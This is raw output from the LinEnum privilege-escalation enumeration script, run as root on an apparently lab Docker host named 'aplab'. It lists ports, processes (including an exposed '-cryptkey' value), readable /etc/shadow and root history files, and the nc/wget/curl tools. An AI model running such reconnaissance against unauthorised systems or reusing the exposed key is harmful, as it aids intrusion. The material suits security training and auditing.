          collisions:0 txqueuelen:0 
          RX bytes:24458 (23.8 KiB)  TX bytes:24458 (23.8 KiB)

veth92dbb9a Link encap:Ethernet  HWaddr 4E:7E:3F:58:E3:52  
          inet6 addr: fe80::4c7e:3fff:fe58:e352%32744/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:215 errors:0 dropped:0 overruns:0 frame:0
          TX packets:209 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:46500 (45.4 KiB)  TX bytes:15798 (15.4 KiB)

vetha65703b Link encap:Ethernet  HWaddr D6:D7:1A:AC:9D:32  
          inet6 addr: fe80::d4d7:1aff:feac:9d32%32744/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:271647 errors:0 dropped:0 overruns:0 frame:0
          TX packets:365248 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:40748865 (38.8 MiB)  TX bytes:45209418 (43.1 MiB)


[-] ARP history:
? (192.168.1.1) at 74:da:88:dc:d1:62 [ether]  on eth0
? (192.168.1.3) at 92:9a:4a:0f:8c:20 [ether]  on eth0
? (172.17.0.3) at 02:42:ac:11:00:03 [ether]  on docker0
? (172.17.0.2) at 02:42:ac:11:00:02 [ether]  on docker0
? (192.168.1.11) at 00:0c:29:55:4b:c0 [ether]  on eth0


[-] Nameserver(s):
nameserver 8.8.8.8
nameserver 8.8.4.4


[-] Default route:
default         192.168.1.1     0.0.0.0         UG    202    0        0 eth0


[-] Listening TCP:
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      3458/docker-proxy
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      3658/sshd
tcp        0      0 192.168.1.4:22          192.168.1.11:41936      ESTABLISHED 3860/0
tcp        0      0 :::10080                :::*                    LISTEN      3515/app
tcp        0      0 :::80                   :::*                    LISTEN      3416/docker-proxy
tcp        0      0 :::22                   :::*                    LISTEN      3658/sshd


[-] Listening UDP:
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
udp        0      0 127.0.0.1:323           0.0.0.0:*                           3591/chronyd
udp        0      0 ::1:323                 :::*                                3591/chronyd


### SERVICES #############################################
[-] Running processes:
PID   USER     TIME   COMMAND
    1 root       0:00 init
    2 root       0:00 [kthreadd]
    3 root       0:02 [ksoftirqd/0]
    5 root       0:00 [kworker/0:0H]
    7 root       0:00 [rcu_sched]
    8 root       0:00 [rcu_bh]
    9 root       0:00 [migration/0]
   10 root       0:00 [watchdog/0]
   11 root       0:00 [watchdog/1]
   12 root       0:00 [migration/1]
   13 root       0:00 [ksoftirqd/1]
   15 root       0:00 [kworker/1:0H]
   16 root       0:00 [khelper]
   17 root       0:00 [kdevtmpfs]
   18 root       0:00 [netns]
   21 root       0:00 [perf]
   33 root       0:00 [kworker/1:1]
  137 root       0:00 [writeback]
  138 root       0:00 [ksmd]
  139 root       0:00 [khugepaged]
  140 root       0:00 [crypto]
  142 root       0:00 [kintegrityd]
  143 root       0:00 [bioset]
  145 root       0:00 [kblockd]
  896 root       0:00 [md]
  903 root       0:00 [devfreq_wq]
 1039 root       0:00 [kswapd0]
 1043 root       0:00 [fsnotify_mark]
 1215 root       0:00 [deferwq]
 1323 root       0:00 [ata_sff]
 1391 root       0:00 [scsi_eh_0]
 1427 root       0:00 [scsi_tmf_0]
 1429 root       0:00 [scsi_eh_1]
 1436 root       0:00 [scsi_tmf_1]
 1438 root       0:00 [kworker/u64:2]
 2302 root       0:00 [mpt_poll_0]
 2304 root       0:00 [mpt/0]
 2305 root       0:00 [scsi_eh_2]
 2306 root       0:00 [scsi_tmf_2]
 2338 root       0:00 [kworker/0:2]
 2358 root       0:00 [kworker/0:3]
 2363 root       0:00 [kworker/0:1H]
 2499 root       0:00 [jbd2/sda3-8]
 2500 root       0:00 [ext4-rsv-conver]
 2501 root       0:00 [kworker/1:1H]
 2820 root       0:00 [ttm_swap]
 2860 root       0:00 [kpsmoused]
 2930 root       0:00 [kworker/1:2]
 3059 root       0:00 [jbd2/sda1-8]
 3060 root       0:00 [ext4-rsv-conver]
 3162 root       0:03 /usr/bin/docker daemon -p /run/docker.pid
 3262 root       0:00 [ipv6_addrconf]
 3392 root       0:00 /bin/sh -c app
 3416 root       0:00 {exe} docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 80 -container-ip 172.17.0.2 -container-port 80
 3420 root       0:00 udhcpc -R -n -p /var/run/udhcpc.eth0.pid -i eth0 -x hostname aplab
 3445 root       0:00 /sbin/klogd
 3458 root       0:00 {exe} docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.17.0.3 -container-port 8080
 3480 root       0:00 /sbin/syslogd
 3515 root       0:06 app
 3521 root       0:23 java -jar /opt/jenkins/jenkins.war
 3542 root       0:00 /sbin/acpid
 3551 root       0:08 app -cryptkey 4e8f1670f502a3d40717709e5f80d67c
 3591 chrony     0:00 /usr/sbin/chronyd -f /etc/chrony/chrony.conf
 3630 root       0:00 /usr/sbin/crond -c /etc/crontabs
 3658 root       0:00 /usr/sbin/sshd
 3662 root       0:00 /sbin/getty 38400 tty1
 3663 root       0:00 /sbin/getty 38400 tty2
 3666 root       0:00 /sbin/getty 38400 tty3
 3669 root       0:00 /sbin/getty 38400 tty4
 3672 root       0:00 /sbin/getty 38400 tty5
 3675 root       0:00 /sbin/getty 38400 tty6
 3793 root       0:00 [bash]
 3807 root       0:00 [kworker/u64:1]
 3860 root       0:00 sshd: root@pts/0
 3862 root       0:00 -sh
 3865 root       0:00 sh LinEnum.sh
 3866 root       0:00 sh LinEnum.sh
 3867 root       0:00 tee -a
 4012 root       0:00 ps aux


[-] /etc/init.d/ binary permissions:
total 228
drwxr-xr-x    2 root     root          4096 May 12  2016 .
drwxr-xr-x   27 root     root          4096 May 13  2016 ..
-rwxr-xr-x    1 root     root           203 Apr 13  2016 acpid
-rwxr-xr-x    1 root     root           380 Mar 18  2016 binfmt
-rwxr-xr-x    1 root     root          5445 Mar 18  2016 bootmisc
-rwxr-xr-x    1 root     root          1817 Feb  3  2016 chronyd
-rwxr-xr-x    1 root     root           720 Mar 18  2016 consolefont
-rwxr-xr-x    1 root     root           165 Apr 13  2016 cron
-rwxr-xr-x    1 root     root          3128 Mar 18  2016 devfs
-rwxr-xr-x    1 root     root           326 Mar 18  2016 dmesg
-rwxr-xr-x    1 root     root           172 Apr 13  2016 dnsd
-rwxr-xr-x    1 root     root           743 May 16  2016 docker
-rwxr-xr-x    1 root     root          2693 Mar 18  2016 fsck
lrwxrwxrwx    1 root     root            23 May 12  2016 functions.sh -> /lib/rc/sh/functions.sh
-rwxr-xr-x    1 root     root           256 Mar 18  2016 hostname
-rwxr-xr-x    1 root     root           152 Apr 13  2016 httpd
-rwxr-xr-x    1 root     root          2591 Mar 18  2016 hwclock
-rwxr-xr-x    1 root     root           720 Mar 18  2016 hwdrivers
-rwxr-xr-x    1 root     root           184 Apr 13  2016 inetd
-rwxr-xr-x    1 root     root          3172 Nov 12  2015 iptables
-rwxr-xr-x    1 root     root           272 Mar 18  2016 keymaps
-rwxr-xr-x    1 root     root           405 Mar 18  2016 killprocs
-rwxr-xr-x    1 root     root           202 Apr 13  2016 klogd
-rwxr-xr-x    1 root     root           602 Nov 18  2015 kmod-static-nodes
-rwxr-xr-x    1 root     root          2210 Mar 18  2016 local
-rwxr-xr-x    1 root     root          3021 Mar 18  2016 localmount
-rwxr-xr-x    1 root     root           785 Mar 18  2016 loopback
-rwxr-xr-x    1 root     root           739 Apr 13  2016 mdev
-rwxr-xr-x    1 root     root          2847 Mar 18  2016 modloop
-rwxr-xr-x    1 root     root           505 Mar 18  2016 modules
-rwxr-xr-x    1 root     root          1082 Mar 18  2016 mount-ro
-rwxr-xr-x    1 root     root          1076 Mar 18  2016 mtab
-rwxr-xr-x    1 root     root          1646 Mar 18  2016 net-online
-rwxr-xr-x    1 root     root          1257 Mar 18  2016 netmount
-rwxr-xr-x    1 root     root          1276 Mar 18  2016 networking
-rwxr-xr-x    1 root     root           207 Apr 13  2016 ntpd
-rwxr-xr-x    1 root     root           715 Mar 18  2016 numlock
-rwxr-xr-x    1 root     root           229 Mar 18  2016 osclock
-rwxr-xr-x    1 root     root           675 Mar 18  2016 procfs
-rwxr-xr-x    1 root     root           253 Apr 13  2016 rdate
-rwxr-xr-x    1 root     root           986 Mar 18  2016 root
-rwxr-xr-x    1 root     root           622 Mar 18  2016 s6-svscan
-rwxr-xr-x    1 root     root          1494 Mar 18  2016 savecache
-rwxr-xr-x    1 root     root          2622 Mar 18  2016 sshd
-rwxr-xr-x    1 root     root          1622 Mar 18  2016 staticroute
-rwxr-xr-x    1 root     root           867 Mar 18  2016 swap
-rwxr-xr-x    1 root     root           804 Mar 18  2016 swapfiles
-rwxr-xr-x    1 root     root           544 Mar 18  2016 swclock
-rwxr-xr-x    1 root     root           623 Mar 18  2016 sysctl
-rwxr-xr-x    1 root     root          3888 Mar 18  2016 sysfs
-rwxr-xr-x    1 root     root           196 Apr 13  2016 syslog
-rwxr-xr-x    1 root     root          1049 Mar 18  2016 termencoding
-rwxr-xr-x    1 root     root           362 Mar 18  2016 tmpfiles.dev
-rwxr-xr-x    1 root     root           338 Mar 18  2016 tmpfiles.setup
-rwxr-xr-x    1 root     root           173 Apr 13  2016 udhcpd
-rwxr-xr-x    1 root     root           949 Mar 18  2016 urandom
-rwxr-xr-x    1 root     root           291 Apr 13  2016 watchdog


### SOFTWARE #############################################
### INTERESTING FILES ####################################
[-] Useful file locations:
/usr/bin/nc
/usr/bin/wget
/usr/bin/curl


[-] Can we read/write sensitive files:
-rw-r--r--    1 root     root          1379 Jul 18 11:36 /etc/passwd
-rw-r--r--    1 root     root           730 May 13  2016 /etc/group
-rw-r--r--    1 root     root           259 Dec 14  2015 /etc/profile
-rw-r-----    1 root     shadow         723 May 13  2016 /etc/shadow


Segmentation fault
[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r--    1 root     root          4138 Dec 16  2015 /etc/udhcpd.conf
-rw-r--r--    1 root     root          1990 May 12  2016 /etc/update-extlinux.conf
-rw-r--r--    1 root     root            53 Dec 14  2015 /etc/sysctl.conf
-rw-r--r--    1 root     root          9435 Mar 18  2016 /etc/rc.conf
-rw-r--r--    1 root     root          7412 Jan 14  2016 /etc/ca-certificates.conf
-rw-r--r--    1 root     root          2788 Apr 13  2016 /etc/mdev.conf
-rw-r--r--    1 root     root            38 Jul 18 10:26 /etc/resolv.conf


[-] Current user's history files:
-rw-------    1 root     root          3555 Jul 18 11:37 /root/.ash_history
-rw-------    1 root     root           358 Jul 18 11:03 /root/.bash_history


[+] Root's history files are accessible!
-rw-------    1 root     root          3555 Jul 18 11:37 /root/.ash_history
-rw-------    1 root     root           358 Jul 18 11:03 /root/.bash_history


[+] Looks like we're in a Docker container:
-rwxr-xr-x    1 root     root             0 Aug 29  2018 /var/lib/docker/overlay/a26597802ba24b7518d73799e8cc2c1162ea2829dbbd7927fada587b0e9f0605-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 May 16  2016 /var/lib/docker/overlay/b51cdbb7eebd806431ee4120d9b3ae050dbefe4a835bf2063446724572e45e30/merged/.dockerenv
-rwxr-xr-x    1 root     root             0 May 16  2016 /var/lib/docker/overlay/b51cdbb7eebd806431ee4120d9b3ae050dbefe4a835bf2063446724572e45e30/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/d87f71d444f46617cc529f91f07d6a5b8a0b9872abb8546e016d1801435dc361/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 29  2018 /var/lib/docker/overlay/78886c6d07763664eb4c49319dfb4a7c9479be5d9aaf932050852d06e8d7f922-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/8e58db78547ddf4f066c29f579fdf963712c5df7fec8f677d62e7e8892c3a269/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 29  2018 /var/lib/docker/overlay/877a9a0e0a00b96cf33164d312d7295f67a49f04d4a9730fff8b92239fe09b15/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/041cceed6ea7c267371c0deebbb6ac1c944c3e2992c4a82708e1373d62322479/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/d87f71d444f46617cc529f91f07d6a5b8a0b9872abb8546e016d1801435dc361-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 29  2018 /var/lib/docker/overlay/78886c6d07763664eb4c49319dfb4a7c9479be5d9aaf932050852d06e8d7f922/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 May 16  2016 /var/lib/docker/overlay/b51cdbb7eebd806431ee4120d9b3ae050dbefe4a835bf2063446724572e45e30-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/5ef48cde7268604a9a6402e027d7fd4ba187f8ff0d01f63f1b3fe3f7388fac0a/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/56e63860ba3a002e4468dd590d222863a362992c6812520fc1da5bafd3cba66a-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/b67e85e622fa710a56551058003a914f4e48f7dfd48cc31157f11c0627f3c116-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/3d318360a0faa36ce5178636640e385c7bbd1186768e933ca98c18884ec1416c-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/37b70e8b7ce3b92ffbc1da4081fae00bd054561370a4444e35a640c9f4f98106-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/b67e85e622fa710a56551058003a914f4e48f7dfd48cc31157f11c0627f3c116/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/dd22dfa24cd0133aa34e5d192d273e0561b4b17460a1b22235baca49d6f7e51e/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 29  2018 /var/lib/docker/overlay/23c5e22b8d0134425b96fb18a19cca2167866210a75521137ad7ce83d0dc4451-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 29  2018 /var/lib/docker/overlay/567745e2b09b44276c51b6e4005206683b05120018671a615dc74c2faa2fed4d/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/fa58692091fba82e88173ddad1d48326ec8287720756f6344db8accbc0f0861f/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/020c54fe6669b021a5d40423d166696b3300f01772f2cc5d9a6041165740b91b-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 May 16  2016 /var/lib/docker/overlay/6759b94c8e77235b9b4ff71a54fa1d6ff1000dd6a2baa57f4c08ec79d8b0c41c-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 29  2018 /var/lib/docker/overlay/cf92f655ac1e441bf6dfa2763cbe2a1ffdf116ae2e41af035566e4cc78364d60-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 29  2018 /var/lib/docker/overlay/f8db4e87447f0423102375419fbe75280d6ca232a1b9f80f367b95dbd774248b-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/8534ed9a91c04a7213f8e4fdda6a556fcdd0fb145bb8dc5d6387b7999d06cf41-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/37b70e8b7ce3b92ffbc1da4081fae00bd054561370a4444e35a640c9f4f98106/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 29  2018 /var/lib/docker/overlay/a794655108c6fd626b9427863eaa35102a643a1593afdd7f4a45d6b6afab3870/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/f02c9b8ed741000751225bb682f9c52d35946be664861a4b6aabe5eba382c918/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 May 14  2016 /var/lib/docker/overlay/8197577bd6ca250c2a275f4c9457b64af8cdd6c60ae1af15c35df5de13d6b72d/merged/.dockerenv
-rwxr-xr-x    1 root     root             0 May 14  2016 /var/lib/docker/overlay/8197577bd6ca250c2a275f4c9457b64af8cdd6c60ae1af15c35df5de13d6b72d/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/75fb1a2daf25d313064302f1d781c151a727aad096fa7524b08c08384501c64d/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/f02c9b8ed741000751225bb682f9c52d35946be664861a4b6aabe5eba382c918-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/b68abc3896cb226df8387d42ea10684caca17886939579482364590b688dd102-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/34a690ba9b022d11809da4c76667ecde20937ca1104c09bebe58cbe574742454/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/020c54fe6669b021a5d40423d166696b3300f01772f2cc5d9a6041165740b91b/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/684670da04e4e5300d6316bdd9f5106f8e92c0cf6ff7cf3424972807afe3c84d-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 29  2018 /var/lib/docker/overlay/877a9a0e0a00b96cf33164d312d7295f67a49f04d4a9730fff8b92239fe09b15-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/dd22dfa24cd0133aa34e5d192d273e0561b4b17460a1b22235baca49d6f7e51e-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/8534ed9a91c04a7213f8e4fdda6a556fcdd0fb145bb8dc5d6387b7999d06cf41/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/8e58db78547ddf4f066c29f579fdf963712c5df7fec8f677d62e7e8892c3a269-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/56e63860ba3a002e4468dd590d222863a362992c6812520fc1da5bafd3cba66a/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/aab1a9271dc4dd68f6f6f6c7c37b705ddaccf119b6f332390a7eac5be4e0944c/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 29  2018 /var/lib/docker/overlay/572d0842257167782231ec2104a9606fb003ec1edd61e35017eda5b2fa559d78/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/08b37d1a8d63ca77fd99fd8e36d22330e2db038e2af36d566358111b014f9462-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/bba108584d12f76ad9565cdd720ad815ca6a67f9fca6015cba253a12fdea8878/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/041cceed6ea7c267371c0deebbb6ac1c944c3e2992c4a82708e1373d62322479-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 29  2018 /var/lib/docker/overlay/567745e2b09b44276c51b6e4005206683b05120018671a615dc74c2faa2fed4d-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/08b37d1a8d63ca77fd99fd8e36d22330e2db038e2af36d566358111b014f9462/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 29  2018 /var/lib/docker/overlay/7d4bd142c50b99277f9b75bdb037a9292bf8755a5e51a328ef12197db6d52f1e/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 29  2018 /var/lib/docker/overlay/5fe0ebc93e2ebe4f1e10ac7662558b6b60eba88914ebf31b68b577233e4df329-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/30c98e9f90400f3ef2187cf84e172501f2ca1f44e74b2c040a4c91fbbaddac7b/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/3d318360a0faa36ce5178636640e385c7bbd1186768e933ca98c18884ec1416c/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/5ef48cde7268604a9a6402e027d7fd4ba187f8ff0d01f63f1b3fe3f7388fac0a-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 29  2018 /var/lib/docker/overlay/7d4bd142c50b99277f9b75bdb037a9292bf8755a5e51a328ef12197db6d52f1e-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/aab1a9271dc4dd68f6f6f6c7c37b705ddaccf119b6f332390a7eac5be4e0944c-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/30c98e9f90400f3ef2187cf84e172501f2ca1f44e74b2c040a4c91fbbaddac7b-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/75fb1a2daf25d313064302f1d781c151a727aad096fa7524b08c08384501c64d-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/bba108584d12f76ad9565cdd720ad815ca6a67f9fca6015cba253a12fdea8878-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 29  2018 /var/lib/docker/overlay/a26597802ba24b7518d73799e8cc2c1162ea2829dbbd7927fada587b0e9f0605/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/fa3fb508debbd51e7ac3675672e136128c5a73b55e933b55df184af095788c3f-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/1feb7abfb3b0012119a80108e32bab04080132d01f23fc351e0ca9b18cbdac3e/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 29  2018 /var/lib/docker/overlay/dddfa08bf11e6655611bdd63bc1a9902f0141629742cca19a76de6ebf24b5c2f/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/fa3fb508debbd51e7ac3675672e136128c5a73b55e933b55df184af095788c3f/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 29  2018 /var/lib/docker/overlay/cf92f655ac1e441bf6dfa2763cbe2a1ffdf116ae2e41af035566e4cc78364d60/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/684670da04e4e5300d6316bdd9f5106f8e92c0cf6ff7cf3424972807afe3c84d/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 29  2018 /var/lib/docker/overlay/a794655108c6fd626b9427863eaa35102a643a1593afdd7f4a45d6b6afab3870-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 May 14  2016 /var/lib/docker/overlay/8197577bd6ca250c2a275f4c9457b64af8cdd6c60ae1af15c35df5de13d6b72d-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/34a690ba9b022d11809da4c76667ecde20937ca1104c09bebe58cbe574742454-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 29  2018 /var/lib/docker/overlay/dddfa08bf11e6655611bdd63bc1a9902f0141629742cca19a76de6ebf24b5c2f-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/b68abc3896cb226df8387d42ea10684caca17886939579482364590b688dd102/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 29  2018 /var/lib/docker/overlay/f8db4e87447f0423102375419fbe75280d6ca232a1b9f80f367b95dbd774248b/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 29  2018 /var/lib/docker/overlay/5fe0ebc93e2ebe4f1e10ac7662558b6b60eba88914ebf31b68b577233e4df329/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/1feb7abfb3b0012119a80108e32bab04080132d01f23fc351e0ca9b18cbdac3e-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 29  2018 /var/lib/docker/overlay/a4ce7c9312f0e0017d43e1ba2b9f3916401f049d0b53286b71c4aa7de23e323b/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 29  2018 /var/lib/docker/overlay/a4ce7c9312f0e0017d43e1ba2b9f3916401f049d0b53286b71c4aa7de23e323b-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 May 16  2016 /var/lib/docker/overlay/6759b94c8e77235b9b4ff71a54fa1d6ff1000dd6a2baa57f4c08ec79d8b0c41c/merged/.dockerenv
-rwxr-xr-x    1 root     root             0 May 16  2016 /var/lib/docker/overlay/6759b94c8e77235b9b4ff71a54fa1d6ff1000dd6a2baa57f4c08ec79d8b0c41c/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 29  2018 /var/lib/docker/overlay/572d0842257167782231ec2104a9606fb003ec1edd61e35017eda5b2fa559d78-init/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 29  2018 /var/lib/docker/overlay/23c5e22b8d0134425b96fb18a19cca2167866210a75521137ad7ce83d0dc4451/upper/.dockerenv
-rwxr-xr-x    1 root     root             0 Aug 28  2018 /var/lib/docker/overlay/fa58692091fba82e88173ddad1d48326ec8287720756f6344db8accbc0f0861f-init/upper/.dockerenv


[+] Looks like we're hosting Docker:
Docker version 1.9.1, build e463610
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                     PORTS                                 NAMES
23c5e22b8d01        ap/jenkins          "/root/dockerfiles/je"   2 years ago         Created                                                          sharp_elion
567745e2b09b        ap/dashboard        "/bin/bash"              2 years ago         Exited (0) 2 years ago                                           goofy_goodall
f8db4e87447f        ap/card-server      "/bin/bash"              2 years ago         Exited (0) 2 years ago                                           big_perlman7
a794655108c6        ap/dashboard        "/bin/bash"              2 years ago         Exited (0) 2 years ago                                           fervent_pike
a26597802ba2        ap/card-server      "/bin/bash"              2 years ago         Exited (1) 2 years ago                                           compassionate_meitner
7d4bd142c50b        ap/card-server      "/bin/bash"              2 years ago         Exited (0) 2 years ago                                           awesome_colden
5fe0ebc93e2e        ap/card-server      "/bin/bash"              2 years ago         Exited (1) 2 years ago                                           backstabbing_bartik
572d08422571        ap/card-server      "/bin/bash"              2 years ago         Exited (0) 2 years ago                                           compassionate_nobel
cf92f655ac1e        ap/dashboard        "/bin/bash"              2 years ago         Exited (0) 2 years ago                                           suspicious_bell
a4ce7c9312f0        ap/dashboard        "/bin/bash"              2 years ago         Exited (0) 2 years ago                                           prickly_tesla
78886c6d0776        ap/dashboard        "/bin/bash"              2 years ago         Exited (127) 2 years ago                                         kickass_darwin
877a9a0e0a00        ap/dashboard        "/bin/bash"              2 years ago         Exited (0) 2 years ago                                           dreamy_lamarr
dddfa08bf11e        ap/card-server      "/bin/bash"              2 years ago         Exited (0) 2 years ago                                           admiring_wright
b68abc3896cb        ap/card-server      "/bin/bash"              2 years ago         Exited (0) 2 years ago                                           mad_rosalind
08b37d1a8d63        ap/dashboard        "/bin/bash"              2 years ago         Exited (0) 2 years ago                                           big_dubinsky
fa58692091fb        ap/card-server      "/bin/bash"              2 years ago         Exited (0) 2 years ago                                           lonely_leavitt
8534ed9a91c0        ap/card-server      "/bin/bash"              2 years ago         Exited (0) 2 years ago                                           condescending_payne
b67e85e622fa        ap/dashboard        "/bin/bash"              2 years ago         Exited (0) 2 years ago                                           suspicious_meninsky
37b70e8b7ce3        ap/dashboard        "/bin/bash"              2 years ago         Exited (0) 2 years ago                                           berserk_newton
041cceed6ea7        ap/card-server      "/bin/bash"              2 years ago         Exited (0) 2 years ago                                           distracted_pike
1feb7abfb3b0        ap/dashboard        "/bin/bash"              2 years ago         Exited (0) 2 years ago                                           furious_joliot
fa3fb508debb        ap/card-server      "/bin/bash"              2 years ago         Exited (0) 2 years ago                                           sick_darwin
dd22dfa24cd0        ap/card-server      "/bin/ls"                2 years ago         Exited (0) 2 years ago                                           determined_einstein
56e63860ba3a        ap/card-server      "/bin/bash ls"           2 years ago         Exited (126) 2 years ago                                         jovial_cray
5ef48cde7268        ap/card-server      "/bin/bash cd /sploit"   2 years ago         Exited (127) 2 years ago                                         clever_mclean
75fb1a2daf25        ap/card-server      "/bin/bash cd ./sploi"   2 years ago         Exited (127) 2 years ago                                         berserk_lumiere
d87f71d444f4        ap/card-server      "/bin/cd sploit"         2 years ago         Created                                                          loving_jennings
30c98e9f9040        ap/card-server      "cd sploit"              2 years ago         Created                                                          naughty_borg
684670da04e4        ap/card-server      "cd sploit"              2 years ago         Created                                                          silly_borg
f02c9b8ed741        ap/card-server      "/bin/cd sploit"         2 years ago         Created                                                          thirsty_kowalevski
bba108584d12        ap/card-server      "/bin/cd sploit"         2 years ago         Created                                                          gigantic_keller
